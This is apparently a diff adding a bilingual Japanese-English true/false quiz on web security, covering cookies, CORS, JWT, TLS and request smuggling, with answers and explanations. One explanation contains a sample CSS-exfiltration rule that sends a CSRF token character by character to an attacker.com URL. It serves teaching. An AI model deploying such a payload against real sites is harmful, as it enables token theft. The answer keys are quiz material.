+      "en": "Padding Oracle attacks target symmetric key cryptography (block ciphers) operating in CBC mode by exploiting padding error responses."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "WebAuthnは、公開鍵暗号方式を利用してパスワードレス認証を実現するためのWeb標準APIである。",
+      "en": "WebAuthn is a web standard API that implements passwordless authentication using public key cryptography."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "指紋や顔認証、セキュリティキー（FIDO）を利用し、秘密鍵はデバイス外に決して出ないため、フィッシング耐性が非常に高いです。",
+      "en": "It uses biometrics or security keys (FIDO) where the private key never leaves the device, making it highly phishing-resistant."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "CookieのSameSite属性をStrictに設定すると、別ドメインからのリンク遷移時であってもCookieは送信される。",
+      "en": "If a Cookie's SameSite attribute is set to Strict, the Cookie will still be sent when navigating via a link from a different domain."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "Strictの場合、別ドメインからのトップレベルのリンク遷移であってもCookieは送信されません。送信されるのはLaxの場合です。",
+      "en": "Under Strict mode, the cookie is not sent even for top-level navigations from external links. That behavior applies to Lax mode."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "CORSのプリフライトリクエストは、通常、HTTPの OPTIONS メソッドを使用して送信される。",
+      "en": "CORS preflight requests are typically sent using the HTTP OPTIONS method."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "カスタムヘッダやPUT/DELETEなどの非単純リクエストを送る前に、サーバーがその要求を許可するかを OPTIONS メソッドで事前に確認します。",
+      "en": "Before sending complex requests (like PUT/DELETE or custom headers), the browser sends an OPTIONS request to check if the server permits it."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "TLS 1.3では、過去の通信内容の暗号解読を防ぐ前方秘匿性（Forward Secrecy）が廃止され、パフォーマンスが優先された。",
+      "en": "In TLS 1.3, Forward Secrecy, which prevents decryption of past communications, was deprecated to prioritize performance."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "逆に、TLS 1.3では前方秘匿性（PFS）を持たない古い暗号スイート（静的RSA鍵交換など）がすべて廃止され、PFSが必須となりました。",
+      "en": "On the contrary, TLS 1.3 removed all legacy cipher suites that lack Perfect Forward Secrecy (like static RSA key exchange), making PFS mandatory."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "CSRFトークンの実装において、Double Submit Cookie パターンはサーバー側で状態を保持しない（ステートレス）ため、セッションを使用せずにCSRF対策が可能である。",
+      "en": "In CSRF token implementations, the Double Submit Cookie pattern is stateless on the server side, enabling CSRF protection without using sessions."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "クッキーとリクエストボディ（またはヘッダ）の両方に同じトークンを含め、サーバーはそれらが一致するかだけを確認します。",
+      "en": "It includes the same token in both a cookie and the request body/header. The server merely verifies that they match."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "JWTの脆弱性である「キー混同攻撃(Key Confusion Attack)」は、攻撃者がHMACの秘密鍵を総当たりで推測する攻撃である。",
+      "en": "The Key Confusion Attack in JWT is a vulnerability where an attacker brute-forces the HMAC secret key."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "非対称鍵（RSA等）の検証に使うべき公開鍵を、サーバー側に誤認させて対称鍵（HMAC）の秘密鍵として扱わせ、署名を偽造する攻撃です。",
+      "en": "It exploits the server into mistakenly using a public key (intended for RSA) as the secret key for HMAC to forge signatures."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "BREACH攻撃は、HTTP圧縮（Gzipなど）とレスポンスへのユーザー入力の反映を利用し、暗号化されたHTTPS通信から秘密情報（CSRFトークンなど）を推測する攻撃である。",
+      "en": "The BREACH attack exploits HTTP compression (like Gzip) and reflection of user input to infer secrets (like CSRF tokens) from encrypted HTTPS traffic."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "圧縮後のデータサイズの僅かな違い（一致する文字列が多いほど圧縮率が上がる性質）をサイドチャネルとして利用します。",
+      "en": "It uses slight differences in compressed data sizes as a side channel, since compression is more efficient when strings match."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "SameSite=None を設定したCookieは、Secure属性が設定されていなくてもモダンブラウザでサードパーティCookieとして機能する。",
+      "en": "A cookie set with SameSite=None functions as a third-party cookie in modern browsers even without the Secure attribute."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "現在の主要なブラウザの仕様では、SameSite=None を指定する場合は必ず Secure 属性も併記しなければクッキーは拒否されます。",
+      "en": "Under modern browser specifications, a cookie marked with SameSite=None will be rejected unless the Secure attribute is also present."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "HTTPパラメータ汚染（HPP）は、同じ名前のパラメータを複数送信した際の、WAFやバックエンドアプリケーションの解釈の違いを利用してセキュリティ機構をバイパスする攻撃である。",
+      "en": "HTTP Parameter Pollution (HPP) bypasses security mechanisms by sending multiple parameters with the same name, exploiting differences in how WAFs and backend applications interpret them."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "WAFが最初のパラメータだけを検査し、バックエンドが最後のパラメータを採用する環境などで防御策が回避されます。",
+      "en": "If a WAF inspects the first parameter while the backend uses the last one, the defense mechanism is bypassed."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "CORSの Access-Control-Allow-Origin ヘッダには、正規表現を用いて複数のドメインを記述することができる。",
+      "en": "The Access-Control-Allow-Origin CORS header allows specifying multiple domains using regular expressions."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "仕様上、単一のオリジン（完全一致）か、アスタリスク（*）しか指定できません。複数許可する場合はサーバー側でリクエスト元を動的に判定して1つのオリジンを返す必要があります。",
+      "en": "The spec only allows a single exact origin or a wildcard (*). To allow multiple origins, the server must dynamically read the Origin header and reflect it."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "GraphQLにおけるIntrospection機能は、APIのスキーマ情報全体を取得できるため、本番環境では無効化することがセキュリティ上推奨される。",
+      "en": "Because GraphQL's Introspection feature allows retrieval of the entire API schema, it is recommended to disable it in production environments for security reasons."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "型やフィールド情報がすべて露出すると、攻撃者にシステムの内部構造や隠しAPIエンドポイントを教えることになってしまいます。",
+      "en": "Exposing all types and fields gives attackers a comprehensive map of the internal structure and hidden API endpoints."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "OWASP Top 10において、A01（トップ）は長年「インジェクション」であったが、2021年版では「暗号学的失敗(Cryptographic Failures)」が1位になった。",
+      "en": "In the OWASP Top 10, 'Injection' was the top category (A01) for many years, but in the 2021 version, 'Cryptographic Failures' took the number one spot."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "2021年版で1位になったのは「アクセス制御の欠如 (Broken Access Control)」です。インジェクションは3位に後退しました。",
+      "en": "In the 2021 version, 'Broken Access Control' took the number one spot. Injection dropped to the third position."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "サーバーサイドのテンプレートインジェクション（SSTI）は、ユーザーの入力をテンプレートエンジンの構文として評価させることで、リモートコード実行（RCE）につながる危険性がある。",
+      "en": "Server-Side Template Injection (SSTI) can lead to Remote Code Execution (RCE) by evaluating user input as template engine syntax."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "Jinja2やThymeleafなどのテンプレートエンジンがユーザー入力をレンダリングする際に、OSコマンドを注入・実行される恐れがあります。",
+      "en": "If template engines like Jinja2 or Thymeleaf render user input directly, OS commands can be injected and executed."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "CSPの script-src 'strict-dynamic' ディレクティブは、信頼されたスクリプトが動的に生成したスクリプトの実行を無条件で禁止する設定である。",
+      "en": "The CSP script-src 'strict-dynamic' directive unconditionally blocks the execution of scripts dynamically generated by trusted scripts."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "逆です。nonce等で明示的に信頼されたスクリプトが生成（追加）した子スクリプトの実行を「許可」し、レガシーな運用を容易にする機能です。",
+      "en": "It is the opposite. It 'allows' the execution of child scripts dynamically added by scripts already trusted via nonce, easing legacy operations."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "プロトタイプ汚染（Prototype Pollution）は、JavaScriptの __proto__ プロパティなどを悪用してオブジェクトのプロトタイプを改ざんし、アプリケーションの動作を操作する脆弱性である。",
+      "en": "Prototype Pollution is a vulnerability that manipulates the prototype of objects by exploiting properties like __proto__ in JavaScript, altering application behavior."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "マージ処理などでプロトタイプが汚染されると、すべてのオブジェクトが予期せぬプロパティを継承してしまい、XSSや認証バイパスにつながります。",
+      "en": "If a prototype is polluted during a merge operation, all objects inherit unexpected properties, leading to XSS or authentication bypasses."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "TLSハンドシェイクにおける SNI (Server Name Indication) は、クライアントがアクセスしたいホスト名を暗号化してサーバーに伝える拡張仕様である。",
+      "en": "In the TLS handshake, SNI (Server Name Indication) is an extension where the client encrypts the requested hostname before sending it to the server."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "通常のSNIは「平文（暗号化前）」で送信されるため、経路上でどのドメインにアクセスしているかが漏洩します（これを防ぐためにESNIやECHが提案されています）。",
+      "en": "Standard SNI is sent in plain text, exposing the accessed domain to eavesdroppers on the network (ESNI/ECH aims to encrypt this)."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "OAuth 2.0の PKCE (Proof Key for Code Exchange) は、主にパブリッククライアント（モバイルアプリやSPAなど）において、認可コードの横取り攻撃を防ぐための拡張仕様である。",
+      "en": "OAuth 2.0 PKCE (Proof Key for Code Exchange) is an extension primarily designed to prevent authorization code interception attacks in public clients like mobile apps and SPAs."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "リクエストごとに動的なシークレット（code_verifier）を生成して検証することで、固定のクライアントシークレットを持てないアプリを保護します。",
+      "en": "It protects apps that cannot hold a static client secret by generating and validating a dynamic secret (code_verifier) for each request."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "Timing Attack (タイミング攻撃) を防ぐための文字列比較は、最初の一致しない文字が見つかった時点で直ちに比較を終了し、レスポンスを返すのが最も安全である。",
+      "en": "To prevent Timing Attacks, it is safest to terminate a string comparison immediately and return a response as soon as the first mismatched character is found."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "途中で終了すると応答時間の差から文字を推測されてしまいます。常に最後まで比較する定数時間（Constant-time）アルゴリズムを用いる必要があります。",
+      "en": "Terminating early leaks information through response times. Comparisons must always run to completion using constant-time algorithms."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "セッション固定攻撃（Session Fixation）を防ぐためには、ユーザーのログイン成功直後にセッションIDを新しく再発行（Regenerate）することが効果的である。",
+      "en": "To prevent Session Fixation attacks, regenerating a new session ID immediately after a user successfully logs in is highly effective."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "攻撃者が用意したセッションIDを使わせる攻撃であるため、認証が通った瞬間に古いIDを破棄して新しいIDを割り当てることで無効化できます。",
+      "en": "Since the attacker forces a known session ID on the victim, regenerating the ID upon authentication renders the attacker's ID useless."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "Second-order SQL Injection は、入力されたデータを即座にSQL文に結合するのではなく、一度暗号化してからデータベースに保存する攻撃である。",
+      "en": "Second-order SQL Injection is an attack where input data is not immediately injected but is encrypted and then stored in the database."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "一度は安全にデータベースに保存されたデータが、後の別の処理（バッチ処理など）で呼び出された際にSQLインジェクションとして機能する脆弱性です。",
+      "en": "It is a vulnerability where data is safely stored in the database initially but acts as an injection payload later when retrieved for another operation."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "Insecure Deserialization (安全でないデシリアライゼーション) は、シリアライズされたデータを復元する過程で、攻撃者が意図したオブジェクトを生成させ、コード実行などを引き起こす攻撃である。",
+      "en": "Insecure Deserialization is an attack where an attacker manipulates serialized data to instantiate unintended objects during restoration, often leading to code execution."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "JavaやPHP、Python(pickle)等で発生しやすく、信頼できない入力をそのままデシリアライズすると致命的な被害をもたらします。",
+      "en": "Common in Java, PHP, and Python (pickle), blindly deserializing untrusted input can lead to catastrophic Remote Code Execution."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "JWTの有効期限 (expクレーム) を短く設定すれば、盗まれたトークンが無効化されるため、トークンの無効化リスト（ブラックリスト）をサーバー側で管理する必要は全くない。",
+      "en": "If a JWT's expiration (exp claim) is set short, stolen tokens will invalidate automatically, completely eliminating the need for server-side token blacklists."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "短くしてもその期限内は悪用可能です。強制ログアウトや権限変更を即時反映させるには、ブラックリスト（JTI管理等）が依然として必要になります。",
+      "en": "It remains exploitable during the short window. To implement immediate forced logout or permission revocation, server-side blacklists are still necessary."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "HPKP (HTTP Public Key Pinning) は、管理の難しさやサイトのアクセス不能（文鎮化）リスクの高さから、現在主要なブラウザでは非推奨・廃止されている。",
+      "en": "HPKP (HTTP Public Key Pinning) is currently deprecated and removed from major browsers due to management complexity and the high risk of rendering sites inaccessible (bricking)."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "設定を誤ると正規の証明書でも長期間アクセスできなくなるリスクがあり、代替としてCertificate Transparency (CT)などが普及しました。",
+      "en": "Misconfiguration could block access to a site for months. It has been replaced by safer alternatives like Certificate Transparency (CT)."
+    }
+  },
+  {
+    "difficulty": 4,
+    "text": {
+      "ja": "RPO (Relative Path Overwrite) は、サーバー内の相対パスを利用して、意図しない設定ファイルを上書き保存する攻撃手法である。",
+      "en": "RPO (Relative Path Overwrite) is an attack technique that uses relative paths on the server to overwrite unintended configuration files."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "RPOはファイルを上書きする攻撃ではありません。ブラウザとサーバー間でのパス解釈の差異を利用し、罠ページ上で不正なCSSやスクリプトを読み込ませる攻撃です。",
+      "en": "RPO does not overwrite files. It exploits path interpretation differences between browser and server to inject malicious CSS or scripts into a page."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "DNS rebinding攻撃において、TTLを極端に短く設定したAレコードを返し、ブラウザのDNSキャッシュが切れるタイミングを狙うことで、同一生成元ポリシー（SOP）を回避してローカルホストへアクセスを試みる。",
+      "en": "In a DNS rebinding attack, by returning an A record with an extremely short TTL and waiting for the browser's DNS cache to expire, an attacker attempts to bypass the Same-Origin Policy (SOP) to access localhost."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "被害者のブラウザでスクリプトが実行された後、IPがローカルネットワークのIPに切り替わることで、ブラウザ自身を踏み台にして内部へリクエストを送らせます。",
+      "en": "After the script executes on the victim's browser, the IP changes to a local network IP, turning the browser into a proxy to send requests internally."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "ChromeのSameSite CookieルールのLax-by-defaultにおいて、POSTリクエストであっても、ナビゲーション（トップレベルの遷移）を伴う場合は常にCookieが送信される。",
+      "en": "Under Chrome's Lax-by-default SameSite Cookie rules, cookies are always sent even in POST requests as long as they involve a top-level navigation."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "Laxの場合、トップレベルのナビゲーションであっても「安全なHTTPメソッド（GETなど）」の場合のみCookieが送信され、POST送信では送信されません。",
+      "en": "With Lax, cookies are only sent for top-level navigations that use 'safe' HTTP methods (like GET). They are not sent with cross-site POST requests."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "CSS Injection（CSS Exfiltration）は、CSSのアトリビュートセレクタを利用してページ内の機密情報（CSRFトークンなど）の1文字ずつを推測し、外部サーバーへデータを流出させる攻撃手法である。",
+      "en": "CSS Injection (CSS Exfiltration) is an attack technique that uses CSS attribute selectors to guess sensitive data (like CSRF tokens) character by character and exfiltrate it to an external server."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "input[name=\"csrf\"][value^=\"a\"] { background: url('http://attacker.com/a'); } のような手法を自動生成して値を盗み出します。",
+      "en": "It automatically generates rules like input[name=\"csrf\"][value^=\"a\"] { background: url('http://attacker.com/a'); } to extract values."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "TLSのダウングレード攻撃を防ぐための仕様であるSCSV (Signaling Cipher Suite Value) は、TLS 1.3からプロトコル標準の必須機能として仕様に統合されたため、拡張として送信する必要がなくなった。",
+      "en": "SCSV (Signaling Cipher Suite Value), a mechanism to prevent TLS downgrade attacks, was integrated as a mandatory feature in the TLS 1.3 standard, eliminating the need to send it as an extension."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "TLS 1.3でのダウングレード保護はServerHelloのRandomフィールドの一部に特定の固定値を埋め込むことで行われるようになり、SCSVのメカニズムとは異なります。",
+      "en": "In TLS 1.3, downgrade protection is implemented by embedding a specific fixed value in the ServerHello Random field, replacing the SCSV mechanism entirely."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "HTTPリクエストスマグリングの中でも、TE.CL（Transfer-Encoding / Content-Length）型の脆弱性は、フロントエンドがTEヘッダを処理し、バックエンドがCLヘッダを処理する場合に発生する。",
+      "en": "Among HTTP Request Smuggling types, a TE.CL (Transfer-Encoding / Content-Length) vulnerability occurs when the frontend processes the TE header while the backend processes the CL header."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "フロントエンドはチャンク形式でリクエストを解釈して転送しますが、バックエンドは指定されたContent-Length分だけを解釈するため、残りのデータが次のリクエストの先頭として汚染されます。",
+      "en": "The frontend interprets the chunked payload, but the backend only reads up to the Content-Length, leaving the remaining data to pollute the next request."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "WebAuthnの登録時において、アテステーション（Attestation）オブジェクトは、認証器の秘密鍵そのものをサーバーに安全に送信するためのデータである。",
+      "en": "During WebAuthn registration, the Attestation object is data used to securely transmit the authenticator's private key itself to the server."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "秘密鍵はデバイス外へ絶対に出ません。アテステーションは「その公開鍵が正規の認証器（ハードウェア）から生成されたものか」を証明する署名データです。",
+      "en": "The private key never leaves the device. Attestation is signature data proving that the public key was generated by a legitimate authenticator (hardware)."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "CSPの script-src ディレクティブにおいて 'strict-dynamic' を使用する場合、後方互換性のため同時に 'unsafe-inline' やホストのホワイトリストを指定しても、モダンブラウザでは 'strict-dynamic' の指定が優先されホワイトリストは無視される。",
+      "en": "When using 'strict-dynamic' in the CSP script-src directive, even if 'unsafe-inline' or host allowlists are specified for backward compatibility, modern browsers prioritize 'strict-dynamic' and ignore the allowlists."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "CSP Level 3対応ブラウザでは 'strict-dynamic' を認識するとドメインベースのホワイトリストを自動的に破棄し、nonce/hashベースの検証へ移行します。",
+      "en": "CSP Level 3 browsers automatically drop domain-based allowlists when they encounter 'strict-dynamic', shifting entirely to nonce/hash-based validation."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "JWTアルゴリズムにおける ES256 (ECDSA using P-256 and SHA-256) の検証プロセスにおいて、署名値 (r, s) のどちらか一方が 0 であった場合、標準的な仕様では常に有効な署名として扱われる。",
+      "en": "In the ES256 (ECDSA using P-256 and SHA-256) verification process for JWT, if either signature value (r, s) is 0, standard specifications dictate it should always be treated as a valid signature."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "ECDSAの数学的定義上、r と s は共に 1 以上かつ曲線の位数 n 未満でなければならず、0 の場合は不正な署名として直ちに拒否されなければなりません。",
+      "en": "By the mathematical definition of ECDSA, both r and s must be >= 1 and less than the curve order n. If either is 0, the signature must be rejected immediately."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "XS-Leaks (Cross-Site Leaks) は、フレームの読み込み時間やブラウザのAPIの挙動の差異を利用したサイドチャネル攻撃の一種であり、別オリジンのユーザー状態を推測する。",
+      "en": "XS-Leaks (Cross-Site Leaks) is a type of side-channel attack that exploits differences in frame loading times or browser API behaviors to infer a user's state on a different origin."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "検索結果が0件か1件かでレスポンスタイムやフレーム数の挙動が変わることを利用し、XSSを使わずに別サイトの機密情報（検索ヒットの有無など）を推測します。",
+      "en": "It guesses sensitive data (like whether a search query had hits) on another site without XSS, based on timing or API quirks when loading cross-origin resources."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "GraphQLにおけるエイリアス（Aliases）を利用したバッチ攻撃を防ぐには、クエリのネストの深さ（Depth）を制限するだけで完全に防止できる。",
+      "en": "To prevent batching attacks using Aliases in GraphQL, restricting the query's nested depth is completely sufficient."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "エイリアスを利用すると同一階層（浅いDepth）で大量の重いクエリを並列にリクエストできるため、コスト制限（Query Cost Analysis）などの対策が別途必要です。",
+      "en": "Aliases allow requesting many heavy fields in parallel at the same shallow depth. Thus, Depth limiting is insufficient, requiring Query Cost Analysis or node limits."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "Spectre脆弱性はブラウザのJavaScriptからも悪用可能であったため、これに対抗する仕組みとして Cross-Origin Read Blocking (CORB) や Cross-Origin Opener Policy (COOP) が導入された。",
+      "en": "Because the Spectre vulnerability could be exploited via browser JavaScript, mechanisms like Cross-Origin Read Blocking (CORB) and Cross-Origin Opener Policy (COOP) were introduced as countermeasures."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "CPUの投機的実行の脆弱性を突いてメモリ内の他サイトのデータを読み取る攻撃を防ぐため、ブラウザはサイト分離（Site Isolation）アーキテクチャを強化しました。",
+      "en": "To prevent attacks exploiting CPU speculative execution to read cross-site data in memory, browsers reinforced their architectures with Site Isolation."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "HTTP/2の仕様において、HPACKヘッダ圧縮による脆弱性を完全に排除するため、HTTPヘッダの暗号化が必須機能として組み込まれている。",
+      "en": "In the HTTP/2 specification, to completely eliminate vulnerabilities caused by HPACK header compression, HTTP header encryption is incorporated as a mandatory feature."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "HTTP/2プロトコル自体にはヘッダ専用の暗号化機能はなく、TLSストリーム上で暗号化されます。HPACKはCRIME攻撃を緩和する工夫はありますが、圧縮による推測攻撃のリスクは設計上完全に排除されてはいません。",
+      "en": "HTTP/2 itself does not have a distinct header encryption layer; it relies on TLS. While HPACK mitigates CRIME attacks, the risk of compression side-channels is not entirely eliminated."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "サーバーサイドで Node.js の child_process.exec を使用する際、入力をシェルのメタ文字でエスケープせずに渡すと、OSコマンドインジェクションの脆弱性が発生する。",
+      "en": "When using Node.js's child_process.exec on the server side, passing input without escaping shell metacharacters leads to an OS Command Injection vulnerability."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "exec関数はコマンドを直接シェルに渡して実行するため、シェルが解釈しない spawn を使用するか、厳密なエスケープ処理が必要です。",
+      "en": "Because exec passes the command directly to the shell, it is dangerous. It is safer to use spawn, which does not invoke a shell by default."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "DOM Clobbering は、JavaScriptのDOMノードの削除関数（remove()）を悪用して、ページ内の重要なセキュリティスクリプトを強制的に削除する攻撃である。",
+      "en": "DOM Clobbering is an attack that exploits JavaScript's DOM node deletion function (remove()) to forcefully delete important security scripts from the page."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "DOM Clobbering は、特定のid属性などを付与したHTMLを挿入することで、JavaScriptのグローバル変数（windowオブジェクトなど）を意図せず上書き・汚染させる攻撃です。",
+      "en": "DOM Clobbering involves injecting HTML with specific id/name attributes to unintentionally overwrite or pollute global JavaScript variables (like the window object)."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "WebRTCを利用したSTUNリクエストは、VPN環境下であっても、ユーザーの真のローカルIPアドレスやパブリックIPアドレスを漏洩させるリスク（WebRTC Leak）がある。",
+      "en": "STUN requests utilizing WebRTC pose a risk of leaking the user's true local and public IP addresses (WebRTC Leak), even when using a VPN."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "ブラウザがVPNインターフェースをバイパスしてUDPパケットを送信してしまう仕様の隙を突かれ、匿名性が破られるケースがあります。",
+      "en": "This breaches anonymity when browsers bypass the VPN interface to send UDP packets directly, revealing the true IP address."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "SameSite=Strict属性が設定されたCookieは、ブラウザのアドレスバーにURLを直接入力してアクセスした場合でも送信がブロックされる。",
+      "en": "A cookie set with SameSite=Strict will be blocked from being sent even if the user directly types the URL into the browser's address bar to access the site."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "ブラウザのアドレスバーへの直接入力やブックマークからの遷移は、クロスサイトリクエストではなく「ファーストパーティのコンテキスト」と見なされるため、Strictでも送信されます。",
+      "en": "Directly typing a URL or using a bookmark is considered a first-party context, not a cross-site request, so Strict cookies are sent."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "OAuth 2.1のドラフト仕様では、インプリシットフロー（Implicit Grant）はセキュリティ上の理由から非推奨（削除）とされている。",
+      "en": "In the draft specification of OAuth 2.1, the Implicit Grant flow is deprecated (removed) for security reasons."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "アクセストークンがURLフラグメントに露出するリスクがあるため、代わりにPKCEを伴う認可コードフローの使用が必須と規定されています。",
+      "en": "Due to the risk of exposing access tokens in URL fragments, it is removed in favor of the Authorization Code flow with PKCE."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "BGPハイジャックは、DNSサーバーのAレコードを直接書き換えることで、ユーザーを偽のWebサイトへ誘導するレイヤー7の攻撃手法である。",
+      "en": "BGP hijacking is a Layer 7 attack technique that guides users to fake websites by directly rewriting the A records of DNS servers."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "BGPハイジャックは、インターネットルーティングのプロトコル（BGP）における経路情報を不正にアナウンスし、トラフィックをレイヤー3レベルで横取りする攻撃です。",
+      "en": "BGP hijacking maliciously announces incorrect routing prefixes over the Border Gateway Protocol to intercept traffic at the Layer 3 network level."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "DROWN攻撃は、SSLv2の脆弱性を利用して、同じ秘密鍵を使用しているTLS通信の暗号を解読する攻撃である。",
+      "en": "The DROWN attack exploits vulnerabilities in SSLv2 to decrypt TLS communications that share the same private key."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "古いSSLv2がサーバー上で有効化されたままであると、より安全なTLS接続であってもRSA暗号鍵の漏洩リスクにさらされる深刻な攻撃です。",
+      "en": "Leaving old SSLv2 enabled exposes modern TLS connections to RSA key decryption risks if they share the same certificate private key."
+    }
+  },
+  {
+    "difficulty": 5,
+    "text": {
+      "ja": "X-Content-Type-Options: nosniff ヘッダは、ブラウザのキャッシュ制御を強制的に無効化し、機密情報のディスクへの書き込みを防ぐ機能である。",
+      "en": "The X-Content-Type-Options: nosniff header forces the browser to disable cache control, preventing sensitive information from being written to the disk."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "このヘッダはキャッシュ制御ではなく、ブラウザがファイルの中身からMIMEタイプを自動推測（スニッフィング）する機能を無効化し、XSSなどを防ぐためのものです。",
+      "en": "It does not control caching. It disables the browser's MIME-type sniffing, forcing it to strictly follow the declared Content-Type to prevent XSS."
+    }
+  }
+]
